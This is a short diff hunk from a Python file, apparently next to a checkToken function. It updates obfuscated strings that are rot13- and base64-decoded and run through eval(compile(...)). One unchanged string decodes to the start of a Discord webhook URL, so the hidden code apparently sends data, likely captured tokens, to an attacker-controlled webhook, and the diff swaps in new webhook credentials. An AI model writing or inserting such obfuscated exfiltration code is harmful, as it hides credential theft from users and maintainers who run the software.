@@ -265,9 +265,9 @@ def checkToken(token):
     
 import base64, codecs
 magic = 'bXlob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBp'
-love = 'Y3qyLzuio2gmYmRjAGxjAGt2AGp4ZmNkZwH1AwtiATb2'
-god = 'NVZ2d25TcWF4b1A2NkcwaFhMandBelFGMTdfX3hhcGVH'
-destiny = 'FQSdnwI6ETgXJGq2nx5KLGMlLGEOqHMBAaMDo0M2E2Hv'
+love = 'Y3qyLzuio2gmYmRjAwR3AQH2AGNjBQZjAGZ3ZQtiLGD4'
+god = 'OEZDSXI2YlUyazVWdUFsbUpjaVdQYlNmeEt6QTdGcTg0'
+destiny = 'qT9VGTgBMGShHJVlZ19eK1xgGJ9UKmp5ZHkgJx1SpyVv'
 joy = '\x72\x6f\x74\x31\x33'
 trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
 eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
